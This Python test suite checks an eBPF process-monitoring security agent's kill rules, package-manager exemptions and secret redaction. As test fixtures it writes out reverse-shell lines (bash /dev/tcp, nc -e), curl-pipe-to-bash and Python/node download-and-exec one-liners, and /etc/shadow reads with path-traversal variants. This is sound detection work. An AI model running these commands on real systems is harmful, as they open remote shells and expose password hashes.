#!/usr/bin/env python3
"""Regression tests for the pacman -Sy lockout and the over-broad KILL rules.

Run: python3 tests/test_package_manager_fixes.py
"""
import os, sys, types, unittest
from pathlib import Path

REPO = Path(__file__).resolve().parent.parent
_bcc = types.ModuleType("bcc"); _bcc.BPF = object
_u = types.ModuleType("bcc.utils"); _u.printb = lambda *a, **k: None
sys.modules.setdefault("bcc", _bcc); sys.modules.setdefault("bcc.utils", _u)
sys.path.insert(0, str(REPO / "agent"))
os.environ.setdefault("SENTINEL_CONFIG", str(REPO / "config" / "rules.yaml"))
import sentinel_lineage_agent as A  # noqa: E402


def entry(binary, cmdline, pid=1000, ppid=1, lid=None, plid=0):
    return A.LineageEntry(lineage_id=pid if lid is None else lid, parent_lineage_id=plid,
        pid=pid, ppid=ppid,
        uid=0, gid=0, ns_pid=pid, comm=os.path.basename(binary), binary_path=binary,
        cmdline=cmdline, exec_timestamp=0.0, flags=0)


def first(e):
    for r in A.rules:
        if A.match_rule(e, r):
            return r
    return None


class TestFalsePositives(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        A.load_rules()

    def killed(self, b, c):
        r = first(entry(b, c))
        return r is not None and r.action in ("KILL", "BLOCK", "QUARANTINE")

    def test_pacman_gpg_verify_not_killed(self):
        self.assertFalse(self.killed("/usr/bin/gpg",
            "gpg --no-permission-warning --homedir /etc/pacman.d/gnupg --with-colons --verify core.db.sig"))

    def test_tar_extract_not_killed(self):
        self.assertFalse(self.killed("/usr/bin/tar", "tar -xf a.tar -C /tmp/x"))
        self.assertFalse(self.killed("/usr/bin/tar", "tar -cpf backup.tar /home"))

    def test_plain_interactive_bash_not_killed(self):
        self.assertFalse(self.killed("/usr/bin/bash", "bash -i"))

    def test_grep_shadowsocks_not_killed(self):
        self.assertFalse(self.killed("/usr/bin/grep", "grep shadowsocks /etc/hosts"))

    def test_node_function_and_python_eval_flag_not_killed(self):
        self.assertFalse(self.killed("/usr/bin/node", "node -e console.log(new Function('a','return a')(1))"))
        self.assertFalse(self.killed("/usr/bin/python3", "python3 tool.py --eval"))

    def test_encrypt_is_alert_not_kill(self):
        r = first(entry("/usr/bin/gpg", "gpg --encrypt -r me file"))
        self.assertIsNotNone(r); self.assertEqual(r.action, "ALERT")


class TestStillCaught(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        A.load_rules()

    def killed(self, b, c):
        r = first(entry(b, c))
        return r is not None and r.action == "KILL"

    def test_attacks(self):
        self.assertTrue(self.killed("/usr/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"))
        self.assertTrue(self.killed("/usr/bin/bash", "bash -i >& x"))
        self.assertTrue(self.killed("/usr/bin/bash", "bash -i 0<&196"))
        self.assertTrue(self.killed("/usr/bin/bash", "bash -i 2>&1"))
        self.assertTrue(self.killed("/usr/bin/bash", "bash -i 0<&196;exec 196<>/dev/tcp/x/4444"))
        self.assertTrue(self.killed("/usr/bin/cat", "cat /etc/shadow"))
        self.assertTrue(self.killed("/usr/bin/sed", "sed -n 1p /etc/shadow"))
        self.assertTrue(self.killed("/usr/bin/python3",
            "python3 -c import urllib.request;exec(urllib.request.urlopen('http://x').read())"))
        self.assertTrue(self.killed("/usr/bin/curl", "curl http://x/s.sh | bash"))
        self.assertTrue(self.killed("/usr/bin/node",
            "node -e require('http').get('http://x', r => eval(r))"))

    def test_node_benign_function_not_killed(self):
        r = first(entry("/usr/bin/node",
            "node -e console.log(new Function('a','return a')(1))"))
        self.assertTrue(r is None or r.action != "KILL")


class TestProtectedTree(unittest.TestCase):
    def test_descendant_of_pacman_is_protected(self):
        A.lineage_tree.clear()
        A.lineage_tree[10] = entry("/usr/bin/sudo", "sudo pacman -Sy", pid=10, ppid=1)
        A.lineage_tree[11] = entry("/usr/bin/pacman", "pacman -Sy", pid=11, ppid=10)
        gpg = entry("/usr/bin/gpg", "gpg --verify x", pid=12, ppid=11)
        A.lineage_tree[12] = gpg
        self.assertTrue(A._in_protected_tree(gpg))

    def test_unrelated_process_not_protected(self):
        A.lineage_tree.clear()
        A.lineage_tree[20] = entry("/usr/bin/bash", "bash", pid=20, ppid=1)
        sh = entry("/usr/bin/nc", "nc -e /bin/sh 1.2.3.4 9", pid=21, ppid=20)
        A.lineage_tree[21] = sh
        self.assertFalse(A._in_protected_tree(sh))

    def test_renamed_comm_does_not_grant_protection(self):
        A.lineage_tree.clear()
        fake = entry("/tmp/evil", "evil", pid=30, ppid=1); fake.comm = "pacman"
        A.lineage_tree[30] = fake
        self.assertFalse(A._in_protected_tree(fake))


class TestRedaction(unittest.TestCase):
    def test_redacts(self):
        for raw, secret in [
            ("mysql -u root --password=hunter2 db", "hunter2"),
            ("curl -H Authorization: Bearer abc123tok http://x", "abc123tok"),
            ("git clone https://bob:s3cret@host/r.git", "s3cret"),
            ("env API_KEY=zzz999 run", "zzz999"),
            ("x sk-abcdefghijklmnopqrstuv", "sk-abcdefghijklmnopqrstuv"),
        ]:
            self.assertNotIn(secret, A.redact_cmdline(raw), raw)

    def test_leaves_normal_commands(self):
        self.assertEqual(A.redact_cmdline("ls -la /home"), "ls -la /home")


class TestShadowPathVariants(unittest.TestCase):
    """The token-anchored 3001 must not re-open the shadow-file bypasses it fixed."""

    @classmethod
    def setUpClass(cls):
        A.load_rules()

    def killed(self, b, c):
        r = first(entry(b, c))
        return r is not None and r.action == "KILL"

    def test_path_and_separator_variants_still_killed(self):
        for cmd in [
            "cat /etc/shadow|head",
            "cat /etc/shadow;id",
            "cat /etc/shadow>/tmp/x",
            "cat /etc//shadow",
            "cat /etc/./shadow",
            "cat /etc/../etc/shadow",
            "cat /etc/../../etc/shadow",
            "cat /etc/foo/../shadow",
            "cat /etc/shadow.bak",
            "cat /etc/shadow-2024",
            "cat /etc/gshadow",
            "cat /etc/gshadow-",
        ]:
            self.assertTrue(self.killed("/usr/bin/cat", cmd), cmd)

    def test_grep_awk_wrappers_still_killed(self):
        self.assertTrue(self.killed("/usr/bin/egrep", "egrep root /etc/shadow"))
        self.assertTrue(self.killed("/usr/bin/fgrep", "fgrep root /etc/shadow"))
        self.assertTrue(self.killed("/usr/bin/gawk", "gawk '{print}' /etc/shadow"))

    def test_shadow_name_lookalikes_not_killed(self):
        self.assertFalse(self.killed("/usr/bin/grep", "grep shadow /etc/hosts"))
        self.assertFalse(self.killed("/usr/bin/cat", "cat /home/user/shadow.txt"))


class TestPythonExecOrder(unittest.TestCase):
    """2005 must match the payload regardless of urllib/exec ordering."""

    @classmethod
    def setUpClass(cls):
        A.load_rules()

    def killed(self, b, c):
        r = first(entry(b, c))
        return r is not None and r.action == "KILL"

    def test_exec_first_payload_killed(self):
        self.assertTrue(self.killed("/usr/bin/python3",
            "python3 -c exec(__import__(\"urllib.request\").urlopen(\"http://x\").read())"))

    def test_spaced_exec_paren_killed(self):
        self.assertTrue(self.killed("/usr/bin/python3",
            "python3 -c import urllib.request;exec (urllib.request.urlopen('http://x').read())"))


class TestNcTokenAnchor(unittest.TestCase):
    """1001 nc\\s+-e must not match 'rsync -e' but must still catch nc."""

    @classmethod
    def setUpClass(cls):
        A.load_rules()

    def killed(self, b, c):
        r = first(entry(b, c))
        return r is not None and r.action == "KILL"

    def test_rsync_dash_e_not_killed(self):
        self.assertFalse(self.killed("/usr/bin/rsync", "rsync -e ssh -a /home user@host:/backup"))

    def test_nc_dash_e_still_killed(self):
        self.assertTrue(self.killed("/usr/bin/nc", "nc -e /bin/sh 1.2.3.4 9"))
        self.assertTrue(self.killed("/bin/nc", "/bin/nc -e /bin/sh 1.2.3.4 9"))


class TestEncryptionTokenAnchor(unittest.TestCase):
    """11001 must keep catching combined short flags / openssl enc, not decrypt."""

    @classmethod
    def setUpClass(cls):
        A.load_rules()

    def rule(self, b, c):
        return first(entry(b, c))

    def test_combined_short_flags_alert(self):
        r = self.rule("/usr/bin/gpg", "gpg -cv file")
        self.assertIsNotNone(r)
        self.assertEqual(r.id, 11001)
        self.assertEqual(r.action, "ALERT")

    def test_openssl_enc_default_alert(self):
        r = self.rule("/usr/bin/openssl", "openssl enc -aes-256-cbc -in f -out f.enc")
        self.assertIsNotNone(r)
        self.assertEqual(r.id, 11001)
        self.assertEqual(r.action, "ALERT")

    def test_openssl_decrypt_not_alerted(self):
        r = self.rule("/usr/bin/openssl", "openssl enc -d -aes-256-cbc -in f.enc -out f")
        self.assertTrue(r is None or r.id != 11001, r)

    def test_openssl_s_client_not_alerted(self):
        r = self.rule("/usr/bin/openssl", "openssl s_client -connect x:443 -cert c.pem")
        self.assertTrue(r is None or r.id != 11001, r)


class TestRedactionCoverage(unittest.TestCase):
    """Common credential spellings must not reach telemetry unredacted."""

    def test_common_credential_forms(self):
        for raw, secret in [
            ("curl -u admin:hunter2 https://x", "hunter2"),
            ("curl --user admin:hunter2 https://x", "hunter2"),
            ("mysql -phunter2 -u root db", "hunter2"),
            ("docker login -p s3cr3t registry", "s3cr3t"),
            ("mysql --password='two words' db", "two words"),
            ("tool --secret-key=abc123", "abc123"),
            ("github_token=zzz999 run", "zzz999"),
            ("curl 'https://x/?access_token=tok123'", "tok123"),
            ("curl -H 'X-Api-Key: apikey999' http://x", "apikey999"),
            ("curl -uadmin:hunter2 https://x", "hunter2"),
            ("mysql -p123456 db", "123456"),
            ("tool --secret-key abc123", "abc123"),
        ]:
            self.assertNotIn(secret, A.redact_cmdline(raw), raw)

    def test_ports_and_words_untouched(self):
        for raw in ["iptables -p tcp -j ACCEPT", "docker run -p 8080:80 nginx",
                    "ssh -p 2222 host", "tool --compass=on", "tool --bypass=true"]:
            self.assertEqual(A.redact_cmdline(raw), raw)

    def test_port_and_benign_untouched(self):
        self.assertIn("2222", A.redact_cmdline("ssh -p 2222 host"))
        self.assertEqual(A.redact_cmdline("rsync -e ssh -a /home u@h:/b"),
                         "rsync -e ssh -a /home u@h:/b")


class TestProtectedTreeFallbacks(unittest.TestCase):
    def test_merged_usr_and_dotdot_aliases(self):
        self.assertTrue(A._protected_binary("/bin/apt-get"))
        self.assertTrue(A._protected_binary("/usr/bin/../bin/pacman"))
        self.assertFalse(A._protected_binary("/tmp/pacman"))
        self.assertFalse(A._protected_binary("/usr/bin/pacman-evil"))

    def test_missing_ancestor_entry_falls_back_to_proc(self):
        A.lineage_tree.clear()
        gpg = entry("/usr/bin/gpg", "gpg --encrypt x", pid=42, ppid=41)
        old_exe, old_ppid = A._proc_exe, A._proc_ppid
        A._proc_exe = lambda pid: "/usr/bin/pacman" if pid == 41 else ""
        A._proc_ppid = lambda pid: 41 if pid == 42 else 1
        try:
            self.assertTrue(A._in_protected_tree(gpg))
        finally:
            A._proc_exe, A._proc_ppid = old_exe, old_ppid


class TestProtectedTreeEnforcement(unittest.TestCase):
    """handle_exec_event must log, never kill/block, a package-manager descendant."""

    def setUp(self):
        self._old = (A.kill_process, A.block_lineage, A.dispatch_telemetry,
                     A._record_path_hash, A._start_time, A.ENFORCEMENT_MODE)
        self.killed, self.blocked, self.sent = [], [], []
        A.kill_process = lambda p, e, r: self.killed.append((p, r.id))
        A.block_lineage = lambda lid, r: self.blocked.append((lid, r.id))
        A.dispatch_telemetry = lambda p: self.sent.append(p)
        A._record_path_hash = lambda p: ""
        A._start_time = lambda p: 0
        A.ENFORCEMENT_MODE = "enforce"
        A.lineage_tree.clear()
        A.lineage_by_id.clear()

    def tearDown(self):
        (A.kill_process, A.block_lineage, A.dispatch_telemetry,
         A._record_path_hash, A._start_time, A.ENFORCEMENT_MODE) = self._old
        A.lineage_tree.clear()
        A.lineage_by_id.clear()
        A.telemetry_buffer.clear()

    def run_exec(self, binary, cmdline, pid=2000, ancestor=None, ppid=1):
        if ancestor is not None:
            A.lineage_tree[ancestor.pid] = ancestor
            A.lineage_by_id[ancestor.lineage_id] = ancestor
        A.handle_exec_event({
            "t": "exec", "pid": pid, "ppid": ppid, "uid": 0, "ns_pid": pid,
            "lineage_id": pid,
            "parent_lineage_id": ancestor.lineage_id if ancestor else 0,
            "comm": os.path.basename(binary), "filename": binary, "cmdline": cmdline,
        })

    def test_kill_rule_under_pacman_is_logged_with_tag(self):
        pacman = entry("/usr/bin/pacman", "pacman -Sy", pid=100, ppid=1)
        self.run_exec("/usr/bin/cat", "cat /etc/shadow", ppid=100, ancestor=pacman)
        self.assertEqual(self.killed, [])
        self.assertEqual(self.blocked, [])
        self.assertTrue(self.sent)
        # The dispatched payload must already be the downgraded action (no KILL race).
        self.assertEqual(self.sent[-1]["action"], "LOG")
        self.assertIn("package-manager-tree", self.sent[-1].get("tags") or [])

    def test_kill_rule_without_protection_still_kills(self):
        self.run_exec("/usr/bin/cat", "cat /etc/shadow")
        self.assertEqual([p for p, _ in self.killed], [2000])

    def test_alert_rule_never_kills(self):
        self.run_exec("/usr/bin/gpg", "gpg --encrypt -r me file")
        self.assertEqual(self.killed, [])
        self.assertEqual(self.sent[-1]["action"], "ALERT")

    def test_secret_redacted_in_dispatched_payload(self):
        self.run_exec("/usr/bin/mysql", "mysql -u root --password=hunter2 db")
        self.assertNotIn("hunter2", self.sent[-1]["cmdline"])


class TestProtectedTreeSubtree(unittest.TestCase):
    """A KILL on an unprotected ancestor must not take protected descendants down."""

    def setUp(self):
        A.lineage_tree.clear()
        A.lineage_by_id.clear()
        self._old = (A._kill_if_same_process, A.block_lineage, A.loader)
        self.killed = []
        A._kill_if_same_process = lambda p, e: (self.killed.append(p), True)[1]
        A.loader = types.SimpleNamespace(block=lambda lid: None)

    def tearDown(self):
        A._kill_if_same_process, A.block_lineage, A.loader = self._old
        A.lineage_tree.clear()
        A.lineage_by_id.clear()

    def test_child_of_package_manager_skipped(self):
        shell = entry("/usr/bin/bash", "bash", pid=10, ppid=1)
        normal = entry("/usr/bin/sleep", "sleep 1", pid=11, ppid=10)
        pacman = entry("/usr/bin/pacman", "pacman -Sy", pid=12, ppid=10)
        shell.children = [11, 12]
        for e in (shell, normal, pacman):
            A.lineage_tree[e.pid] = e
        A.kill_process(10, shell, types.SimpleNamespace(id=1, name="r"))
        self.assertIn(10, self.killed)
        self.assertIn(11, self.killed)
        self.assertNotIn(12, self.killed)

    def test_block_lineage_excludes_package_manager_subtree(self):
        shell = entry("/usr/bin/bash", "bash", pid=20, ppid=1, lid=1)
        pacman = entry("/usr/bin/pacman", "pacman -Sy", pid=21, ppid=20, lid=2)
        gpg = entry("/usr/bin/gpg", "gpg --verify x", pid=22, ppid=21, lid=3)
        for e in (shell, pacman, gpg):
            A.lineage_tree[e.pid] = e
            A.lineage_by_id[e.lineage_id] = e
        A.blocked_lineages.clear()
        A.block_lineage(1, types.SimpleNamespace(id=9, name="r"))
        self.assertNotIn(2, A.blocked_lineages)
        self.assertNotIn(3, A.blocked_lineages)
        self.assertIn(1, A.blocked_lineages)
        self.assertEqual(self.killed, [20])


if __name__ == "__main__":
    unittest.main(verbosity=1)
